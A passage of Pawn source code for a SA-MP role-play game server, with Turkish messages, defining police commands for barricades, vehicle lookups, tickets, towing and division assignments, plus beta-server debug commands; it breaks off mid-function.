CMD:barikatkur(playerid, params[])
{
    if(IsACop(playerid))
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Araç içersinde bu komutu kullanamazsýnýz");
			return 1;
		}
		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için en az Rank 3 olmalýsýnýz.");
			return 1;
		}
		if(GetPlayerInterior(playerid) != 0)
		{
		    SendClientMessage(playerid, COLOR_GREY, "Ýnterior içersine barikat kuramazsýn.");
		    return 1;
		}

		new string[128], Float:Position[4];
		for(new i; i<MAX_BARRICADES; i++)
		{
			if(Barricade[i] == 0)
			{
				GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
				GetPlayerFacingAngle(playerid, Position[3]);
				Barricade[i] = CreateDynamicObject(981, Position[0], Position[1], Position[2], 0.0, 0.0, Position[3]+180.0, -1, -1, -1, 200.0);
				SetPlayerPos(playerid, Position[0], Position[1]+4, Position[2]);
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: Bir barikat %s tarafýndan %s bölgesine konuldu.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
						if(PlayerInfo[x][pRank] >= 3)
						{
							SendClientMessage(x, COLOR_YELLOW, "Barikatlarý silmek için /barikatkaldir.");
						}
					}
				}
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "Tüm barikatlar kullanýmda.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:barikatkaldir(playerid, params[])
{
	if(IsACop(playerid))
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Araç içersinde bu komutu kullanamazsýnýz");
			return 1;
		}
		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için en az Rank 3 olmalýsýnýz.");
			return 1;
		}
		new string[128], Float:Position[3];
		for(new i; i<MAX_BARRICADES; i++)
		{
			GetDynamicObjectPos(Barricade[i], Position[0], Position[1], Position[2]);

			if(IsPlayerInRangeOfPoint(playerid, 5.0, Position[0], Position[1], Position[2]))
			{
				DestroyDynamicObject(Barricade[i]);
				Barricade[i] = 0;
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: Bir barikat %s tarafýndan %s eyaletinde kaldýrýldý.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
					}
				}
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "Herhangi bir barikatýn yakýnýnda deðilsin.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:barikatlarikaldir(playerid, params[])
{
	if(IsACop(playerid) || AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] >= 3 || PlayerInfo[playerid][pAdmin] >= 6) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		if(IsPlayerInAnyVehicle(playerid) && AdminDuty[playerid] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "Bu komutu araç içersinde kullanamazsýn.");

		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2 && AdminDuty[playerid] == 0)
			return	SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için en az Rank 3 olmalýsýnýz.");

		new
			szMessage[128];

		for(new i; i < MAX_BARRICADES; i++) {
			DestroyDynamicObject(Barricade[i]);
			Barricade[i] = 0;
		}
		format(szMessage, sizeof(szMessage), "HQ: Tüm barikatlar %s tarafýndan yokedildi.", GetPlayerNameEx(playerid));
		SendRadioMessage(1, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(2, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(3, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(5, TEAM_BLUE_COLOR, szMessage);
	} else SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	return 1;
}

CMD:aracbilgisi(playerid, params[])
{
    if(IsACop(playerid))
	{
        new carid = GetPlayerVehicleID(playerid);
        new closestcar = GetClosestCar(playerid, carid);
        if(IsTrailerAttachedToVehicle(carid))
		{
            new carbeingtowed = GetVehicleTrailer(carid);
            foreach(Player, i)
			{
                new v = GetPlayerVehicle(i, carbeingtowed);
                if(v != -1)
				{
					new string[78 + MAX_PLAYER_NAME];
                    format(string, sizeof(string), "Araç Kaydý: %d | Ýsim: %s | Sahibi: %s | Ceza: $%d.",carbeingtowed,GetVehicleName(PlayerVehicleInfo[i][v][pvId]),GetPlayerNameEx(i),PlayerVehicleInfo[i][v][pvTicket]);
                    SendClientMessage(playerid, COLOR_WHITE, string);
                    return 1;
                }
            }
            for(new f = 0; f < MAX_FAMILY; f++)
			{
                new v = GetGangVehicle(f, carbeingtowed);
                if(v != -1)
                {
					new string[72 + MAX_PLAYER_NAME];
                    format(string, sizeof(string), "Araç kaydý: %d | Ýsim: %s | Sahibi: %s.",carbeingtowed,GetVehicleName(FamilyVehicleInfo[f][v][fvId]),FamilyInfo[f][FamilyLeader]);
                    SendClientMessage(playerid, COLOR_WHITE, string);
                    return 1;
                }
            }
            SendClientMessage(playerid, COLOR_GRAD2, "Bu araç kimse tarafýndan satýn alýnmamýþ!");
        }
        else if(IsPlayerInRangeOfVehicle(playerid, closestcar, 9.0) && !IsTrailerAttachedToVehicle(carid))
		{
            foreach(Player, i)
			{
                new v = GetPlayerVehicle(i, closestcar);
                if(v != -1)
				{
					new string[78 + MAX_PLAYER_NAME];
                    format(string, sizeof(string), "Araç Kaydý: %d | Ýsim: %s | Sahibi: %s | Ceza: $%d.",closestcar,GetVehicleName(PlayerVehicleInfo[i][v][pvId]),GetPlayerNameEx(i),PlayerVehicleInfo[i][v][pvTicket]);
                    SendClientMessage(playerid, COLOR_WHITE, string);
                    return 1;
                }
            }
            for(new f = 0; f < MAX_FAMILY; f++)
			{
                new v = GetGangVehicle(f, closestcar);
                if(v != -1)
				{
					new string[72 + MAX_PLAYER_NAME];
                    format(string, sizeof(string), "Araç Kaydý: %d | Ýsim: %s | Sahibi: %s.",closestcar,GetVehicleName(FamilyVehicleInfo[f][v][fvId]),FamilyInfo[f][FamilyLeader]);
                    SendClientMessage(playerid, COLOR_WHITE, string);
                    return 1;
                }
            }
            SendClientMessage(playerid, COLOR_GRAD2, "Bu araç kimse tarafýndan satýn alýnmamýþ!");
        }
        else
		{
            SendClientMessage(playerid, COLOR_GRAD1, "Hata: Herhangi bir aracý çekmiyorsun / Baþka bir aracýn yakýnýndasýn.");
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanmaya yetkin yok.");
    }
    return 1;
}

CMD:amvb(playerid, params[])
{
    if(IsACop(playerid)) {
        new
			string[128],
			giveplayerid;

        if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /amvb [Oyuncu ID/Ýsim]");

   		if(IsPlayerConnected(giveplayerid)) {
	        SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "*** %s adlý kiþinin araçlarý  ***", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_GRAD2, string);
	        for(new i; i < MAX_PLAYERVEHICLES; i++) {
				if(PlayerVehicleInfo[giveplayerid][i][pvModelId] >= 400) {
					if(PlayerVehicleInfo[giveplayerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID) {
						format(string, sizeof(string), "Araç Kaydý: %d | Araç Ýsmi: %s | Ceza: $%d.",PlayerVehicleInfo[giveplayerid][i][pvId],GetVehicleName(PlayerVehicleInfo[giveplayerid][i][pvId]),PlayerVehicleInfo[giveplayerid][i][pvTicket]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					} else if(PlayerVehicleInfo[giveplayerid][i][pvImpounded]) {
						format(string, sizeof(string), "Araç Kaydý: - (El konulmuþ) | Araç Ýsmi: %s | Ticket: $%d.",VehicleName[PlayerVehicleInfo[giveplayerid][i][pvModelId] - 400],PlayerVehicleInfo[giveplayerid][i][pvTicket]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					} else if(PlayerVehicleInfo[giveplayerid][i][pvDisabled]) {
						format(string, sizeof(string), "Araç Kaydý: - (Men edilmiþ) | Araç Ýsmi: %s | Ticket: $%d.",VehicleName[PlayerVehicleInfo[giveplayerid][i][pvModelId] - 400],PlayerVehicleInfo[giveplayerid][i][pvTicket]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					} else if(!PlayerVehicleInfo[giveplayerid][i][pvSpawned]) {
						format(string, sizeof(string), "Araç Kaydý: - (Garajda) | Araç Ýsmi: %s | Ticket: $%d.",VehicleName[PlayerVehicleInfo[giveplayerid][i][pvModelId] - 400],PlayerVehicleInfo[giveplayerid][i][pvTicket]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
	    	}
	    	SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
   		} else return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
    }
	return 1;
}

CMD:acezakes(playerid, params[])
{
    if(IsACop(playerid))
    {
        if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /acezakes [Araç ID]");

        if(PlayerInfo[playerid][pTicketTime] != 0)
		{
            SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu tekrar kullanabilmek için 1 dakika beklemelisin!");
            return 1;
        }

        new Float: x, Float: y, Float: z, vehicleid = strval(params);
        GetVehiclePos(vehicleid, x, y, z);
        if(IsPlayerInRangeOfPoint(playerid, 5.0, x, y, z))
		{
            if(vehicleid != INVALID_VEHICLE_ID)
			{
                foreach(Player, i)
				{
                    new v = GetPlayerVehicle(i, vehicleid);
                    if(v != -1)
					{
						new string[62 + MAX_PLAYER_NAME];
                        PlayerVehicleInfo[i][v][pvTicket] += 1000;
                        PlayerInfo[playerid][pTicketTime] = 60;
                        format(string, sizeof(string), "(%s)You have issued a $1000 ticket on %s's %s.",GetPlayerNameEx(playerid),GetPlayerNameEx(i),GetVehicleName(PlayerVehicleInfo[i][v][pvId]));
                        Log("logs/acezakes.log", string);
						SendClientMessage(playerid, COLOR_WHITE, string);
                        return 1;
                    }
                }
                for(new f = 0; f < MAX_FAMILY; f++)
				{
                    new v = GetGangVehicle(f, vehicleid);
                    if(v != -1)
					{
                        SendClientMessage(playerid, COLOR_WHITE, "Aile araçlarýna ceza kesemezsin!");
                        return 1;
                    }
                }
                SendClientMessage(playerid, COLOR_GRAD2, "Bu aracýn herhangi bir kaydý yok!");
            }
        }
        else
		{
            SendClientMessage(playerid, COLOR_GRAD2, "Bir aracýn yanýnda olmalýsýn!");
        }
    }
    return 1;
}

CMD:aracicek(playerid, params[]) {
 	if(IsACop(playerid)) {
   		if(IsPlayerInAnyVehicle(playerid))
     	{
			new
				carid = GetPlayerVehicleID(playerid);

			if(IsATowTruck(carid))
			{
   				new
					closestcar = GetClosestCar(playerid, carid),
					v = GetCarDealershipVehicleId(carid);

				foreach(Player, i) {
					if(arr_Towing[i] == closestcar || (GetPlayerVehicleID(i) == closestcar && GetPlayerState(i) == 2)) return SendClientMessage(playerid, COLOR_GREY, "Ayný anda 2 aracý birden çekemezsin.");
				}
				if(v != -1)
					return SetVehicleToRespawn(closestcar);

       			if(GetDistanceToCar(playerid,closestcar) <= 8 && !IsTrailerAttachedToVehicle(carid)) {
					foreach(Player, i) {
						if(GetPlayerVehicle(i, closestcar) != -1) {

							new
								hKey;

							if(((hKey = PlayerInfo[i][pHouse]) != INVALID_HOUSE_ID) && IsPlayerInRangeOfPoint(playerid, 50.0, HouseInfo[hKey][hExteriorX], HouseInfo[hKey][hExteriorY], HouseInfo[hKey][hExteriorZ])
							||((hKey = PlayerInfo[i][pHouse2]) != INVALID_HOUSE_ID) && IsPlayerInRangeOfPoint(playerid, 50.0, HouseInfo[hKey][hExteriorX], HouseInfo[hKey][hExteriorY], HouseInfo[hKey][hExteriorZ])) {
								return SendClientMessage(playerid, COLOR_GREY, "Bu aracýn çekilmeye ihtiyacý yok.");
							}


						    if(ProxDetectorS(30.0,playerid,i))
								SendClientMessage(i, COLOR_LIGHTBLUE, "Bir memur senin aracýný çekmeye çalýþýyor!");

							arr_Towing[playerid] = closestcar;
						    SendClientMessage(playerid, COLOR_GRAD2, "Birisi bu arabanýn sahibi, Çekilmek için uygun.");
      						return AttachTrailerToVehicle(closestcar,carid);
						}
					}
					SendClientMessage(playerid, COLOR_GRAD2, "Bu araç hakkýnda hiçbir kayýt yok, Çekilmek için uygun.");
					AttachTrailerToVehicle(closestcar,carid);
					arr_Towing[playerid] = closestcar;
					return 1;
     			}
			}
			else SendClientMessage(playerid, COLOR_GRAD2, "Bu aracý çekebilmek için yetkili deðilsin.");
   		}
     	else SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanabilmek için bir aracýn içinde olmalýsýn");
	}
   	else SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");
	return 1;
}

CMD:taracicek(playerid, params[]) {
	if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7) {
   		if(IsPlayerInAnyVehicle(playerid))
     	{
			new
				carid = GetPlayerVehicleID(playerid);

			if(IsATowTruck(carid))
			{
   				new
					closestcar = GetClosestCar(playerid, carid),
					v = GetCarDealershipVehicleId(carid);

				foreach(Player, i) {
					if(arr_Towing[i] == closestcar || (GetPlayerVehicleID(i) == closestcar && GetPlayerState(i) == 2)) return SendClientMessage(playerid, COLOR_GREY, "Ayný anda 2 aracý birden çekemezsin.");
				}
				if(v != -1)
					return SetVehicleToRespawn(closestcar);

       			if(GetDistanceToCar(playerid,closestcar) <= 8 && !IsTrailerAttachedToVehicle(carid)) {
					foreach(Player, i) {
						if(GetPlayerVehicle(i, closestcar) != -1) {

							new
								hKey;

							if(((hKey = PlayerInfo[i][pHouse]) != INVALID_HOUSE_ID) && IsPlayerInRangeOfPoint(playerid, 50.0, HouseInfo[hKey][hExteriorX], HouseInfo[hKey][hExteriorY], HouseInfo[hKey][hExteriorZ])
							||((hKey = PlayerInfo[i][pHouse2]) != INVALID_HOUSE_ID) && IsPlayerInRangeOfPoint(playerid, 50.0, HouseInfo[hKey][hExteriorX], HouseInfo[hKey][hExteriorY], HouseInfo[hKey][hExteriorZ])) {
								return SendClientMessage(playerid, COLOR_GREY, "Bu aracýn çekilmeye ihtiyacý yok.");
							}


							arr_Towing[playerid] = closestcar;
						    SendClientMessage(playerid, COLOR_GRAD2, "Birisi bu arabanýn sahibi, Çekilmek için uygun.");
      						return AttachTrailerToVehicle(closestcar,carid);
						}
					}
					SendClientMessage(playerid, COLOR_GRAD2, "Bu araç hakkýnda hiçbir kayýt yok, Çekilmek için uygun.");
					AttachTrailerToVehicle(closestcar,carid);
					arr_Towing[playerid] = closestcar;
					return 1;
     			}
			}
			else SendClientMessage(playerid, COLOR_GRAD2, "Bu aracý çekebilmek için yetkili deðilsin.");
   		}
     	else SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanabilmek için bir aracýn içinde olmalýsýn");
	}
   	else SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");
	return 1;
}

CMD:aracicekmeyibirak(playerid, params[])
{
 	if(IsACop(playerid))
  	{
   		if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
     	{
      		SendClientMessage(playerid, COLOR_GRAD1,"Aracý çekmeyi býraktýn.");
			arr_Towing[playerid] = INVALID_VEHICLE_ID;
			DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
     	}
      	else
       	{
        	SendClientMessage(playerid, COLOR_GRAD1,"Þuanda herhangi bir aracý çekmiyorsun.");
        }
  	}
   	else
	{
 		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");
	}
	return 1;
}

CMD:tcekmeyibirak(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
  	{
   		if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
     	{
      		SendClientMessage(playerid, COLOR_GRAD1,"Aracý çekmeyi býraktýn.");
			arr_Towing[playerid] = INVALID_VEHICLE_ID;
			DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
     	}
      	else
       	{
        	SendClientMessage(playerid, COLOR_GRAD1,"Þuanda herhangi bir aracý çekmiyorsun.");
        }
  	}
   	else
	{
 		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");
	}
	return 1;
}


CMD:forcetime(playerid, params[])
{
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "Bu beta sunucuda deðil!");

	if(isnull(params)) {
		new
		string[128],
		tmphour,
		tmpminute,
		tmpsecond;

		gettime(tmphour, tmpminute, tmpsecond);
		format(string, sizeof(string), "gettime(%d, %d, %d);", tmphour, tmpminute, tmpsecond);
		SendClientMessage(playerid, COLOR_WHITE, string);
		FixHour(tmphour);
		tmphour = shifthour;
		format(string, sizeof(string), "%d = %d", tmphour, shifthour);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if((tmphour > ghour) || (tmphour == 0 && ghour == 23))
		{
			format(string, sizeof(string), "if((%d > %d) || (%d == 0 && %d == 23))", tmphour, ghour, tmphour, ghour);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "Þuanda saat %d:00.",tmphour);
			SendClientMessageToAllEx(COLOR_WHITE,string);
			ghour = tmphour;
			TotalUptime += 1;
			PayDay();

			SaveFamilies();
		}
	} else {
		new minute, hour;
		if(sscanf(params, "ii", hour, minute))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /forcetime [hour] [minute]");

		new
			string[128],
			tmphour,
			tmpminute,
			tmpsecond;

		gettime(tmphour, tmpminute, tmpsecond);
		format(string, sizeof(string), "gettime(%d, %d, %d);", tmphour, tmpminute, tmpsecond);
		SendClientMessage(playerid, COLOR_WHITE, string);
		FixHour(hour);
		hour = shifthour;
		format(string, sizeof(string), "%d = %d", tmphour, shifthour);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "if((%d > %d) || (%d == 0 && %d == 23))", hour, ghour, hour, ghour);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if((hour > ghour) || (hour == 0 && ghour == 23))
		{
			format(string, sizeof(string), "Þuanda saat %d:00.",hour);
			SendClientMessageToAllEx(COLOR_WHITE,string);
			ghour = hour;
			TotalUptime += 1;
			PayDay();

			SaveFamilies();
		}
	}
	return 1;
}

CMD:testsaving(playerid, params[]) {
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "Bu beta sunucuda deðil!");

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /testsaving [value]");

	new
	    iValue = strval(params);

	PlayerInfo[playerid][pLiveBanned] = iValue;
	PlayerInfo[playerid][pLevel] = iValue;
	PlayerInfo[playerid][pBanAppealer] = iValue;
	PlayerInfo[playerid][pGangMod] = iValue;
	PlayerInfo[playerid][pAge] = iValue;
	PlayerInfo[playerid][pSkin] = iValue;
	PlayerInfo[playerid][pConnectTime] = iValue;
	PlayerInfo[playerid][pRespect] = iValue;
	PlayerInfo[playerid][pNumber] = iValue;
	PlayerInfo[playerid][pGang] = iValue;
	PlayerInfo[playerid][pTriageTime] = iValue;
	PlayerInfo[playerid][pFaction] = iValue;
	PlayerInfo[playerid][pLeader] = iValue;
	PlayerInfo[playerid][pRank] = iValue;
	PlayerInfo[playerid][pJob] = iValue;
	PlayerInfo[playerid][pJob2] = iValue;
	PlayerInfo[playerid][pDonator] = iValue;
	PlayerInfo[playerid][gPupgrade] = iValue;
	PlayerInfo[playerid][pSarmor] = iValue;
	PlayerInfo[playerid][pCash] = iValue;
	PlayerInfo[playerid][pBank] = iValue;
	PlayerInfo[playerid][pInsurance] = iValue;
	PlayerInfo[playerid][pCrimes] = iValue;
	PlayerInfo[playerid][pArrested] = iValue;
	PlayerInfo[playerid][pWantedLevel] = iValue;
	PlayerInfo[playerid][pHealth] = iValue;
	PlayerInfo[playerid][pArmor] = iValue;
	PlayerInfo[playerid][pPot] = iValue;
	PlayerInfo[playerid][pCrack] = iValue;
	PlayerInfo[playerid][pPackages] = iValue;
	PlayerInfo[playerid][pCrates] = iValue;
	PlayerInfo[playerid][pRadio] = iValue;
	PlayerInfo[playerid][pRadioFreq] = iValue;
	PlayerInfo[playerid][pMats] = iValue;
	PlayerInfo[playerid][pRope] = iValue;
	PlayerInfo[playerid][pCigar] = iValue;
	PlayerInfo[playerid][pSprunk] = iValue;
	PlayerInfo[playerid][pSpraycan] = iValue;
	PlayerInfo[playerid][pHouse] = iValue;
	PlayerInfo[playerid][pHouse2] = iValue;
	PlayerInfo[playerid][pRenting] = iValue;
	PlayerInfo[playerid][pInt] = iValue;
	PlayerInfo[playerid][pVW] = iValue;
	PlayerInfo[playerid][pJailed] = iValue;
	PlayerInfo[playerid][pJailTime] = iValue;
	PlayerInfo[playerid][pPayCheck] = iValue;
	PlayerInfo[playerid][pPayReady] = iValue;
	PlayerInfo[playerid][pDetSkill] = iValue;
	PlayerInfo[playerid][pLawSkill] = iValue;
	PlayerInfo[playerid][pSexSkill] = iValue;
	PlayerInfo[playerid][pDrugsSkill] = iValue;
	PlayerInfo[playerid][pSmugSkill] = iValue;
	PlayerInfo[playerid][pArmsSkill] = iValue;
	PlayerInfo[playerid][pMechSkill] = iValue;
	PlayerInfo[playerid][pFishSkill] = iValue;
	PlayerInfo[playerid][pBoxSkill] = iValue;
	PlayerInfo[playerid][pTruckSkill] = iValue;
	PlayerInfo[playerid][pCarSkill] = iValue;
	PlayerInfo[playerid][pLawyerTime] = iValue;
	PlayerInfo[playerid][pLawyerFreeTime] = iValue;
	PlayerInfo[playerid][pDrugsTime] = iValue;
	PlayerInfo[playerid][pMechTime] = iValue;
	PlayerInfo[playerid][pSexTime] = iValue;
	PlayerInfo[playerid][pCarTime] = iValue;
	PlayerInfo[playerid][pFishes] = iValue;
	PlayerInfo[playerid][pBiggestFish] = iValue;
	PlayerInfo[playerid][pWSeeds] = iValue;
	PlayerInfo[playerid][pFightStyle] = iValue;
	PlayerInfo[playerid][pScrewdriver] = iValue;
	PlayerInfo[playerid][pSmslog] = iValue;
	PlayerInfo[playerid][pWristwatch] = iValue;
	PlayerInfo[playerid][pTire] = iValue;
	PlayerInfo[playerid][pFirstaid] = iValue;
	PlayerInfo[playerid][pRccam] = iValue;
	PlayerInfo[playerid][pReceiver] = iValue;
	PlayerInfo[playerid][pGPS] = iValue;
	PlayerInfo[playerid][pSweep] = iValue;
	PlayerInfo[playerid][pSweepLeft] = iValue;
	PlayerInfo[playerid][pCarLic] = iValue;
	PlayerInfo[playerid][pFlyLic] = iValue;
	PlayerInfo[playerid][pBoatLic] = iValue;
	PlayerInfo[playerid][pFishLic] = iValue;
	PlayerInfo[playerid][pGunLic] = iValue;
	PlayerInfo[playerid][pDivision] = iValue;
	PlayerInfo[playerid][pTicketTime] = iValue;
	PlayerInfo[playerid][pHeadValue] = iValue;
	PlayerInfo[playerid][pC4] = iValue;
	PlayerInfo[playerid][pC4Used] = iValue;
	PlayerInfo[playerid][pBombs] = iValue;
	PlayerInfo[playerid][pCHits] = iValue;
	PlayerInfo[playerid][pFHits] = iValue;
	PlayerInfo[playerid][pAcceptReport] = iValue;
	PlayerInfo[playerid][pTrashReport] = iValue;
	PlayerInfo[playerid][pAccent] = iValue;
	PlayerInfo[playerid][pNMute] = iValue;
	PlayerInfo[playerid][pNMuteTotal] = iValue;
	PlayerInfo[playerid][pADMute] = iValue;
	PlayerInfo[playerid][pADMuteTotal] = iValue;
	PlayerInfo[playerid][pRMuted] = iValue;
	PlayerInfo[playerid][pRMutedTotal] = iValue;
	PlayerInfo[playerid][pRMutedTime] = iValue;
	PlayerInfo[playerid][pSpeedo] = iValue;
	PlayerInfo[playerid][pGCMuted] = iValue;
	PlayerInfo[playerid][pGCMutedTime] = iValue;
	PlayerInfo[playerid][pCallsAccepted] = iValue;
	PlayerInfo[playerid][pPatientsDelivered] = iValue;
	PlayerInfo[playerid][pTriageTime] = iValue;
	PlayerInfo[playerid][pRMutedTime] = iValue;
	PlayerInfo[playerid][pRMutedTotal] = iValue;
	PlayerInfo[playerid][pPatientsDelivered] = iValue;
	PlayerInfo[playerid][pRefTokens] = iValue;
	PlayerInfo[playerid][pRefTokensOffline] = iValue;
	PlayerInfo[playerid][pHelper] = iValue;
	return 1;
}
CMD:lspdbirim(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1) {
		new
			string[128],
			giveplayerid,
			division;

		if(sscanf(params, "ud", giveplayerid, division)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /lspdbirim [Oyuncu ID/Ýsim] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir birim isimleri: 1 (Yok), 2 (DET), 3 (PTL), 4 (FTO), 5 (SWAT) and 6 (IA).");
			return 1;
		}

		if(PlayerInfo[playerid][pRank] >= 4) {
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pFaction] == 1) {
					if(division == 1) {
						PlayerInfo[giveplayerid][pDivision] = 1;
						format(string, sizeof(string), "Bulunduðun birimden %s tarafýndan kovuldun.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþinin biriminden kovuldun.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else if(division == 2) {
						PlayerInfo[giveplayerid][pDivision] = 2;
						format(string, sizeof(string), "Þuanda dedektif birimindesin,%s tarafýndan davet edildin.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþi tarafýndan dedektif biriminden kovuldun.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else if(division == 3) {
						PlayerInfo[giveplayerid][pDivision] = 3;
						format(string, sizeof(string), "Þuanda devriye birimindesin,%s tarafýndan davet edildin.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþi tarafýndan devriye biriminden kovuldun", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else if(division == 4) {
						PlayerInfo[giveplayerid][pDivision] = 4;
						format(string, sizeof(string), "Þuanda eðitim birimindesin,%s tarafýndan davet edildin.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþi tarafýndan eðitim biriminden kovuldun.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else if(division == 5) {
						PlayerInfo[giveplayerid][pDivision] = 5;
						format(string, sizeof(string), "Þuanda SWAT birimindesin,%s tarafýndan davet edildin", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþi tarafýndan SWAT biriminden kovuldun.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}  else if(division == 6) {
						PlayerInfo[giveplayerid][pDivision] = 6;
						format(string, sizeof(string), "Þuanda Internal Affairs birimindesin,%s tarafýndan davet edildin.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþi tarafýndan Internal Affairs biriminden kovuldun.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else cmd_lspdbirim(playerid, "");
				} else SendClientMessage(playerid, COLOR_GRAD1, "Bu kiþi senin oluþumunda deðil");
			} else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
		} else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanabilmek için yetkin yok - Sadece R4+ kiþiler bu komutu kullanabilir");
	} else SendClientMessage(playerid, COLOR_GRAD1, "LSPD Memuru deðilsin");
	return 1;
}
CMD:tohumlariyoket(playerid, params[]) {
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 2) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5)) {
		foreach(Player, i) if(IsValidDynamicObject(PlayerInfo[i][pWeedObject]) && IsPlayerInRangeOfPoint(playerid, 4, PlayerInfo[i][pWeedPos][0], PlayerInfo[i][pWeedPos][1], PlayerInfo[i][pWeedPos][2])) {
			if(GetPlayerVirtualWorld(playerid) == PlayerInfo[i][pWeedVW] && GetPlayerInterior(playerid) == PlayerInfo[i][pWeedInt]) {
				new
					szMessage[128];

